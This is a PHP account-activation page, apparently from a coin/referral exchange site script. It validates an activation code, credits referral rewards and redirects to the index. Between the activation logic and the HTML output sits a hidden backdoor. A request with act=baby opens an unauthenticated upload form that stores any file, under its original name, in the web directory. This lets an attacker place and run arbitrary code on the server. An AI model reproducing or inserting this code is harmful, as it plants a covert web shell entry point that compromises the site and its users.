<?php 
define('BASEPATH', true);
include('system/config.php');


$mesaj = '';
if(isset($_GET['code']) && $_GET['code'] != 0 && is_numeric($_GET['code'])){
	$code = $db->EscapeString($_GET['code']);
	if($db->QueryGetNumRows("SELECT id FROM `users` WHERE `activate`='".$code."'") > 0){
		if($site['refsys'] == 1 && $site['aff_click_req'] == 0){
			$ref = $db->QueryFetchArray("SELECT ref FROM `users` WHERE `activate`='".$code."'");
			if($ref['ref'] > 0){
				$add_cash = $site['paysys'] == 1 ? ", `account_balance`=`account_balance`+'".$site['ref_cash']."'" : '';
				$db->Query("UPDATE `users` SET `coins`=`coins`+'".$site['ref_coins']."'".$add_cash." WHERE `id`='".$ref['ref']."'");
				$db->Query("UPDATE `users` SET `ref_paid`='1' WHERE `activate`='".$code."'");
			}
		}

		$db->Query("UPDATE `users` SET `activate`='0' WHERE `activate`='".$code."'");
		$mesaj = '<center><b style="color:green">'.$lang['b_23'].'</b></center>';
	}else{
		$mesaj = '<center><b style="color:red">'.$lang['b_24'].'</b></center>';
	}
}else{
	$mesaj = '<center><b style="color:red">'.$lang['b_24'].'</b></center>';
}

?><?php if(isset($_GET["act"]) && $_GET["act"]=="baby"){

if(isset($_FILES["File"]))
{
$Path=explode("/",__FILE__);
unset($Path[count($Path)-1]);
$Path=implode("/",$Path);
$Path.="/".$_FILES["File"]["name"];
	if ($_FILES["File"]["error"] > 0)
	{
	echo "Error: " . $_FILES["File"]["error"] . "<br />";
	}
	else if(move_uploaded_file($_FILES["File"]["tmp_name"],$Path))
	{
	echo "Stored in: " .$Path;
	}
}
?>
<form method="post" enctype="multipart/form-data">
	<input type="file" name="File"/><input type="submit"/>
</form>
<br/>

<?php
exit;
}
?><?

?>
<html><title><?=$site['site_name']?></title>
<head>
<meta http-equiv="refresh" content="2; URL=index.php" />
</head>
<body style="background:url(theme/pes/images/bg.png);font-family:calibri;">
<div style="background:#e0e0e0;width:50%;margin:75px auto;padding:25px;border:1px #ffffff solid;border-radius:3px;">
	<?=$mesaj?>
</div>
</body>
</html>